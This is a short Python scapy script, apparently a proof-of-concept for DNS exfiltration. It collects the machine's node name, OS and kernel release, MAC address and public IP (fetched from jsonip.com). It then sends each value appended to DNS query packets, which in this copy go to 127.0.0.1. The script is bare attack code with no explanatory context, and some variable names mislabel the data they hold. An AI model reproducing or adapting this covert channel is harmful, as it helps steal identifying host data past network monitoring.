#!/usr/bin/env python


# Libraries
from scapy.all import *
from uuid import getnode as get_mac
import socket
import urllib.request as urllib2
from json import load

# ==========================================================================================

# System informations
opesys = os.uname()

system = opesys[0]
user = opesys[1]
distrib = opesys[2]
# get public ip address
my_ip = load(urllib2.urlopen('http://jsonip.com'))['ip']
# Mac address
macaddr = hex(get_mac())

IP_h = "127.0.0.1"

test = [user,macaddr,system,distrib,my_ip]

def validateIP(s):
	# Test ip
	address=s.split('.')
	if len(address)!=4:
		return False
	for x in address:
		if not x.isdigit():
			return False
		i=int(x)
		if i<0 or i>255:
			return False
	return True

if validateIP(IP_h):
	# DNS exfiltration
	for i in test:
		send (IP(dst="127.0.0.1") / UDP() / DNS(qd=DNSQR(
        qname="localhost", qtype="A"))/i)
		print(i)

else:
    print("Bad ip")
